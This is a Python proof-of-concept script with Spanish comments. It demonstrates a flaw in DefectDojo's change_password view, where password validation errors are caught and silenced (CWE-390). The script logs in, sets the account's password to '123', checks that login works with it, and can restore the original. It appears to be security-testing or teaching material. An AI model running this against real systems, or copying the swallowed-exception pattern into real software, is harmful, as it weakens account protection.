"""
A10:2025 — Vuln 3: Validacion de contrasena detectada pero silenciada (CWE-390)

change_password en dojo/user/views.py llama a validate_password() dentro de
un try/except Exception: pass. La ValidationError que Django lanza ante
contrasenas debiles es capturada y silenciada — la contrasena se guarda
igualmente sin importar su complejidad.

Este script cambia la contrasena del usuario autenticado a un valor
trivialmente debil y confirma que el login con esa contrasena funciona.

ATENCION: el script modifica la contrasena del usuario. Usar --revert para
restaurar la contrasena original al finalizar.

Uso:
    python A10_V3.py --host http://<HOST> --user <USER> --password <PASS>
    python A10_V3.py --host http://<HOST> --user <USER> --password <PASS> --revert
"""

import argparse
import http.cookiejar
import re
import urllib.error
import urllib.parse
import urllib.request

WEAK_PASSWORD = "123"


# ---------------------------------------------------------------------------
# Helpers HTTP
# ---------------------------------------------------------------------------

def _make_opener(jar: http.cookiejar.CookieJar) -> urllib.request.OpenerDirector:
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def _get_csrf(
    opener: urllib.request.OpenerDirector,
    url: str,
    jar: http.cookiejar.CookieJar | None = None,
) -> str:
    req = urllib.request.Request(url, method="GET")
    html = ""
    try:
        with opener.open(req) as r:
            html = r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        html = e.read().decode(errors="replace")
    m = re.search(r'name="csrfmiddlewaretoken"\s+value="([^"]+)"', html)
    if m:
        return m.group(1)
    # Fallback: Django siempre setea el cookie csrftoken; usarlo directamente
    if jar is not None:
        for c in jar:
            if c.name == "csrftoken":
                return c.value
    raise RuntimeError(f"No se encontro csrfmiddlewaretoken en {url}")


def login(host: str, username: str, password: str) -> http.cookiejar.CookieJar:
    login_url = f"{host}/login"
    jar = http.cookiejar.CookieJar()
    opener = _make_opener(jar)
    csrf = _get_csrf(opener, login_url, jar)
    body = urllib.parse.urlencode({
        "username": username,
        "password": password,
        "csrfmiddlewaretoken": csrf,
    }).encode()
    req = urllib.request.Request(
        login_url, data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": login_url},
        method="POST",
    )
    try:
        with opener.open(req):
            pass
    except urllib.error.HTTPError:
        pass
    for c in jar:
        if c.name == "sessionid":
            return jar
    raise RuntimeError("Login fallido — no se recibio sessionid")


def change_password(host: str, jar: http.cookiejar.CookieJar, new_password: str) -> int:
    change_url = f"{host}/change_password"
    opener = _make_opener(jar)
    csrf = _get_csrf(opener, change_url, jar)
    body = urllib.parse.urlencode({
        "new_password": new_password,
        "csrfmiddlewaretoken": csrf,
    }).encode()
    req = urllib.request.Request(
        change_url, data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": change_url},
        method="POST",
    )
    try:
        with opener.open(req) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


def verify_login(host: str, username: str, password: str) -> bool:
    """Intenta hacer login y devuelve True si llega al dashboard."""
    login_url = f"{host}/login"
    jar = http.cookiejar.CookieJar()
    opener = _make_opener(jar)
    csrf = _get_csrf(opener, login_url, jar)
    body = urllib.parse.urlencode({
        "username": username,
        "password": password,
        "csrfmiddlewaretoken": csrf,
    }).encode()
    req = urllib.request.Request(
        login_url, data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": login_url},
        method="POST",
    )
    try:
        with opener.open(req) as r:
            final_url = r.url
    except urllib.error.HTTPError as e:
        final_url = e.url or ""
    return "dashboard" in final_url or "login" not in final_url


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

def exploit(host: str, username: str, original_password: str, revert: bool) -> None:
    host = host.rstrip("/")

    print("\n" + "=" * 60)
    print("VULN A10-3 — CWE-390: Validacion de contrasena silenciada")
    print("=" * 60)

    print(f"\n[1] Login como '{username}'...")
    jar = login(host, username, original_password)
    print("    Sesion iniciada correctamente")

    print(f"\n[2] Cambiando contrasena a '{WEAK_PASSWORD}' (debil, violaría politica)...")
    code = change_password(host, jar, WEAK_PASSWORD)
    if code in (200, 302):
        print(f"    HTTP {code} — contrasena cambiada sin error  <- VALIDACION SILENCIADA")
    else:
        print(f"    HTTP {code} — respuesta inesperada")
        return

    print(f"\n[3] Verificando login con contrasena debil '{WEAK_PASSWORD}'...")
    ok = verify_login(host, username, WEAK_PASSWORD)
    if ok:
        print(f"    Login exitoso con '{WEAK_PASSWORD}'  <- VULNERABILIDAD CONFIRMADA")
        print()
        print("    La politica de contrasenas de DefectDojo exige minimo 8 caracteres,")
        print("    mayusculas, minusculas y numeros — todo ignorado silenciosamente.")
    else:
        print("    Login fallido (la vulnerabilidad podria haber sido corregida)")

    if revert:
        print(f"\n[4] Restaurando contrasena original...")
        jar2 = login(host, username, WEAK_PASSWORD)
        code = change_password(host, jar2, original_password)
        if code in (200, 302):
            print(f"    Contrasena restaurada a la original")
        else:
            print(f"    ATENCION: no se pudo restaurar (HTTP {code})")
            print(f"    La contrasena actual del usuario es '{WEAK_PASSWORD}'")
    else:
        print(f"\n    ATENCION: la contrasena de '{username}' es ahora '{WEAK_PASSWORD}'")
        print(f"    Ejecutar con --revert para restaurarla.")

    print()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Exploit A10 Vuln 3 — CWE-390: Validacion silenciada"
    )
    parser.add_argument("--host", required=True, help="URL base, ej: http://host:8080")
    parser.add_argument("--user", required=True, help="Usuario")
    parser.add_argument("--password", required=True, help="Contrasena actual")
    parser.add_argument("--revert", action="store_true",
                        help="Restaurar la contrasena original al finalizar")
    args = parser.parse_args()

    exploit(args.host, args.user, args.password, args.revert)
